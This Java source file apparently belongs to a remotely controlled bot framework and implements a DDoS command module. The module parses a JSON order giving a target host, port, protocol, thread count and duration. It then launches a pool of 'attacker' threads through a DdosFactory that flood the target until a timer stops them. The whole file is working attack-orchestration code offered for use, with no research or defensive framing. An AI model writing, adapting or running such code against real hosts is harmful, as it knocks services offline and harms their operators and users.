package gq.glowman554.modules.impl;

import gq.glowman554.utils.Log;
import gq.glowman554.modules.Module;
import gq.glowman554.modules.impl.ddos.DDOSPattern;
import gq.glowman554.modules.impl.ddos.DdosFactory;
import net.shadew.json.Json;
import net.shadew.json.JsonNode;
import net.shadew.json.JsonSyntaxException;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class DdosCommand implements Module {
    public boolean stopThread = false;
    public int duration = 0;
    ScheduledExecutorService threadPool;
    TimeChecker timeChecker;

    @Override
    public String execute(String target) {
        Json json = Json.json();

        try {
            JsonNode root = json.parse(target);
            DDOSPattern ddosPattern = new DDOSPattern();

            int port = root.get("port") == null ? 80 : root.get("port").asInt();
            int threads = root.get("threads") == null ? 100 : root.get("threads").asInt();
            int hours = root.get("hours") == null ? 0 : root.get("hours").asInt();
            int minutes = root.get("minutes") == null ? 100 : root.get("minutes").asInt();
            int seconds = root.get("seconds") == null ? 100 : root.get("seconds").asInt();
            String protocol = root.get("protocol") == null ? "tcp" : root.get("protocol").asString();
            String host = root.get("host").asString();

            ddosPattern.setPort(port);
            ddosPattern.setThreads(threads);
            ddosPattern.setHours(hours);
            ddosPattern.setMinutes(minutes);
            ddosPattern.setSeconds(seconds);
            ddosPattern.setTimeout(1);
            ddosPattern.setSocketTimeout(1);
            ddosPattern.setProtocol(protocol);
            ddosPattern.setHost(host);

            duration = (ddosPattern.getHours() * 3600) + (ddosPattern.getMinutes() * 60) + (ddosPattern.getSeconds());

            threadPool = Executors.newScheduledThreadPool(threads);
            timeChecker = new TimeChecker();
            timeChecker.start();
            stopThread = false;

            for (int i = 0; i < threads; i++) {
                // add a new attacker thread to the threadpool
                threadPool.scheduleWithFixedDelay(DdosFactory.createDDOS(ddosPattern), 1, ddosPattern.getTimeout(), TimeUnit.MILLISECONDS);
            }

            while (!stopThread) {
                Thread.sleep(10);
            }

            return "Finished ddos for " + host + ":" + port;
        } catch (JsonSyntaxException | InterruptedException e) {
            return e.getMessage();
        }
    }

    private void stopAll() {
        Log.log("stopAll()");

        if (timeChecker != null) {
            timeChecker.interrupt();
        }

        stopThread = true;

        if (threadPool != null) {
            threadPool.shutdownNow();
        }

        threadPool = null;
    }

    class TimeChecker extends Thread {

        @Override
        public void run() {
            while (!isInterrupted() && !stopThread && duration > 0) {
                try {
                    Log.log("duration = " + duration);
                    duration -= 1;
                    Thread.sleep(1000);
                } catch (InterruptedException ex) {
                    interrupt();
                    stopThread = true;
                    duration = 0;
                    ex.printStackTrace();
                    break;
                }
            }
            stopAll();
        }
    }
}
